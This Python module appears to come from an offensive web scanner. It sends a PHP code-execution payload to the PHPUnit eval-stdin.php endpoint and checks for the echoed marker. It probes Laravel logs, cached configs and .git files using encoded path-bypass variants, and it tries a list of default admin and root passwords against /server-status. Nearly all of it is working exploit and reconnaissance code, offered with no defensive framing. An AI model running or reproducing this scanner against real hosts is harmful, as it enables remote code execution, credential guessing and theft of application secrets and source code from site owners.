# -*- coding: utf-8 -*-
import hashlib
import time

from core import http, stack, ui

AUTH = [("admin", "admin"), ("admin", "password"), ("admin", "123456"),
        ("admin", "admin123"), ("root", "root")]

PHP_EXTRA = [
    ("GET", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", ""),
    ("POST", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
     '<?php echo "PWNED123"; ?>'),
    ("GET", "/_ignition/health-check", ""),
    ("GET", "/storage/logs/laravel.log", ""),
    ("GET", "/bootstrap/cache/config.php", ""),
]


def variants(path):
    head, _, name = path.rpartition("/")
    out = [path + ".", path + "%20", path + "/", "/" + path]
    out.append("/index.php" + path)
    out.append("/public/index.php" + path)
    if name.startswith("."):
        out.append(head + "/%2e" + name[1:])
        out.append(head + "/%2E" + name[1:].upper())
    return out


def try_path(host, path, skip=""):
    for round_ in range(1):
        if round_:
            time.sleep(3)
        for v in variants(path):
            try:
                r = http.get(host, v, referer="https://" + host + "/")
            except Exception:
                continue
            if r.status_code == 200 and len(r.content) > 20:
                if skip and hashlib.sha1(r.content).hexdigest() == skip:
                    time.sleep(1.0)
                    continue
                return v, r
            time.sleep(0.6)
    return "", None


def extras(host, tags):
    hits = []
    if "php" in tags or "laravel" in tags or "opencart" in tags:
        for method, path, body in PHP_EXTRA:
            try:
                r = http.request(host, path, method, body, "text/plain",
                                 referer="https://" + host + "/")
            except Exception:
                continue
            if "PWNED123" in r.text:
                hits.append((path, "RCE", r.text))
                continue
            if "APP_KEY" in r.text or "APP_ENV" in r.text:
                hits.append((path, "env", r.text))
                continue
            if r.status_code == 200 and len(r.content) > 300:
                hits.append((path, "200", r.text))
            time.sleep(0.5)

    for path in ("/.git/HEAD.", "/.git/config.", "//.git/HEAD"):
        try:
            r = http.get(host, path, referer="https://" + host + "/")
        except Exception:
            continue
        t = r.text
        if "ref:" in t or "repositoryformatversion" in t:
            hits.append((path, "git", t))
        time.sleep(0.5)

    for u, p in AUTH:
        try:
            r = http.get(host, "/server-status", auth=(u, p))
        except Exception:
            continue
        if r.status_code == 200:
            hits.append(("/server-status", "auth", r.text[:1500]))
            break

    return hits


def report(hits):
    for path, kind, body in hits:
        ui.say("--- %s [%s] ---" % (path, kind))
        ui.say(" ".join(body.split())[:400])